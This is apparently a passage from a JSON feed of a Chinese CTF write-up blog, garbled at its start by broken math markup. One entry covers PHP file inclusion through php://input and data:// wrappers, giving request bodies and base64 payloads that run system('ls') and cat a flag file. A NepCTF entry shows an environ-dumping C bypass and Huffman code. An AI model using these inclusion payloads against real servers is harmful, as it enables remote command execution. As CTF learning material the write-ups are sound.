cjk_fallback\">没</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">经</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">严</span><span class=\"mord cjk_fallback\">格</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">过</span><span class=\"mord cjk_fallback\">滤</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">直</span><span class=\"mord cjk_fallback\">接</span><span class=\"mord cjk_fallback\">带</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">了</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">函</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">攻</span><span class=\"mord cjk_fallback\">击</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">修</span><span class=\"mord cjk_fallback\">改</span></span></span></span>_GET [‘filename’] 的值，执行非预期的操作。</p>\n</blockquote>\n<ul>\n<li>【file:// 协议】</li>\n</ul>\n<blockquote>\n<p>file:// 协议在双 off 的情况下也可以正常使用；</p>\n<p>allow_url_fopen ：off/on</p>\n<p>allow_url_include：off/on</p>\n<p>file:// 用于访问本地文件系统，在 CTF 中通常用来读取本地文件的且不受 allow_url_fopen 与 allow_url_include 的影响。</p>\n<p>使用方法：</p>\n<p>file:// [文件的绝对路径和文件名]</p>\n</blockquote>\n<ul>\n<li>【php:// 协议】</li>\n</ul>\n<blockquote>\n<p>条件：</p>\n<p>不需要开启 allow_url_fopen，仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。</p>\n<p>php://filter 读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。</p>\n<p>php://input 可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。</p>\n</blockquote>\n<ul>\n<li>【data:// 协议】</li>\n</ul>\n<blockquote>\n<p>经过测试官方文档上存在一处问题，经过测试 PHP 版本 5.2，5.3，5.5，7.0；data:// 协议是是受限于 allow_url_fopen 的，官方文档上给出的是 NO，所以要使用 data:// 协议需要满足双 on 条件</p>\n<p>例子：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW4=\">http://127.0.0.1/cmd.php?file=data://text/plain</span>,<?php phpinfo()?></p>\n<p>or</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9jbWQucGhwP2ZpbGU9ZGF0YTovL3RleHQvcGxhaW47YmFzZTY0LFBEOXdhSEFnY0dod2FXNW1ieWdwUHo0PQ==\">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></p>\n</blockquote>\n<p><img data-src=\"/img/webpic/713e77b23fb645afa92fb923eda7ac77.png\" alt=\"img\"></p>\n<ol>\n<li>方法一：</li>\n</ol>\n<p>php 协议：</p>\n<p><img data-src=\"/img/webpic/image-20230824233946558.png\" alt=\"image-20230824233946558\"></p>\n<p>只能用 burp 不能用 harkbar 有点奇怪</p>\n<p>请求包：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/?page=PhP://input</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">61.147.171.105:64567</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">21</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&lt;?php system(\"ls\");?></pre></td></tr></table></figure><p>有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824234142386.png\" alt=\"image-20230824234142386\"></p>\n<p>得到 flag</p>\n<ol start=\"2\">\n<li>方法二：</li>\n</ol>\n<p><img data-src=\"/img/webpic/image-20230824235157008.png\" alt=\"image-20230824235157008\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"ls\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=   //推荐</span></span></pre></td></tr></table></figure><p>都可以</p>\n<p><img data-src=\"/img/webpic/image-20230824235301184.png\" alt=\"image-20230824235301184\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain,&lt;?php system(\"cat fl4gisisish3r3.php\")?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">data</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==   //推荐</span></span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/08/13/Nep-wp/",
            "url": "http://example.com/2023/08/13/Nep-wp/",
            "title": "Nep__wp",
            "date_published": "2023-08-13T13:28:56.000Z",
            "content_html": "<h1 id=\"nepctf-wp\"><a class=\"markdownIt-Anchor\" href=\"#nepctf-wp\">#</a> NepCTF   wp</h1>\n<p>第一次大型比赛，得到这个成绩也不错了。</p>\n<p><img data-src=\"/img/wp/image-20230813204701517.png\" alt=\"image-20230813204701517\"></p>\n<blockquote>\n<p>{ = 空格</p>\n</blockquote>\n<h2 id=\"1-misc\"><a class=\"markdownIt-Anchor\" href=\"#1-misc\">#</a> 1. misc:</h2>\n<h4 id=\"1codes\"><a class=\"markdownIt-Anchor\" href=\"#1codes\">#</a> 1.codes:</h4>\n<pre><code>环境env要\nen\\\nv绕过下\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>en\\</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>viron<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>en\\</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> en\\</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>viron<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/1.png\" alt=\"\"></p>\n<h4 id=\"2与ai共舞的哈夫曼\"><a class=\"markdownIt-Anchor\" href=\"#2与ai共舞的哈夫曼\">#</a> 2. 与 AI 共舞的哈夫曼</h4>\n<p><u>这就是 hint 嘛，年轻人就要年轻，正经人谁自己写代码</u></p>\n<p>AI 代码放进去，自己给 嘻嘻</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> heapq</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">HuffmanNode</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span>char <span class=\"token operator\">=</span> char</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__lt__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> other<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">&lt;</span> other<span class=\"token punctuation\">.</span>freq</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> char<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_codes</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">,</span> current_code<span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span> node <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>char <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        huffman_codes<span class=\"token punctuation\">[</span>node<span class=\"token punctuation\">.</span>char<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> current_code</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>right<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">compress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">if</span> byte <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    root <span class=\"token operator\">=</span> build_huffman_tree<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    compressed_data <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        compressed_data <span class=\"token operator\">+=</span> huffman_codes<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    padding <span class=\"token operator\">=</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    compressed_data <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span> <span class=\"token operator\">*</span> padding</pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token comment\"># Write frequency information</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> freq <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token comment\"># Write compressed data</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            byte <span class=\"token operator\">=</span> compressed_data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree_from_bytes</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decompress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        frequencies_count <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>frequencies_count<span class=\"token punctuation\">)</span><span class=\"token 